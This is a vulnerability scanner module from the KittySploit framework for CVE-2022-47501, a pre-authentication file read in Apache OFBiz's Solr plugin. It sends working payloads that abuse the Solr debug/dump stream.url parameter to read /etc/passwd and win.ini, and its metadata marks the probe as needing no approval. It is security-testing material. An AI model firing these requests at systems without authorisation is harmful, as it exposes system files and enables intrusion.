#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Arbitrary file reading vulnerability in Apache Software Foundation Apache OFBiz when using the Solr plugin."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache OFBiz < 18.12.07 - Local File Inclusion Detection',
        'description': 'Arbitrary file reading vulnerability in Apache Software Foundation Apache OFBiz when using the Solr plugin. This is a pre-authentication attack. This issue affects Apache OFBiz: before 18.12.07.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'apache', 'ofbiz', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    }],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://lists.apache.org/thread/k8s76l0whydy45bfm4b69vq0mf94p3wc',
            'http://www.openwall.com/lists/oss-security/2023/04/18/5',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-47501',
            'http://www.openwall.com/lists/oss-security/2023/04/18/9',
            'http://www.openwall.com/lists/oss-security/2023/04/19/1'],
        'cve': 'CVE-2022-47501',
    }

    def run(self):
        for path in ('/solr/solrdefault/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd', '/solr/solrdefault/debug/dump?param=ContentStreams&stream.url=file://c:/windows/win.ini'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('bit app support', 'fonts', 'extensions',)
            body_regexes = ('root:.*:0:0:',)
            if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason='Apache OFBiz < 18.12.07 - Local File Inclusion detected',
                    path=path,
                )
                return True
        return False

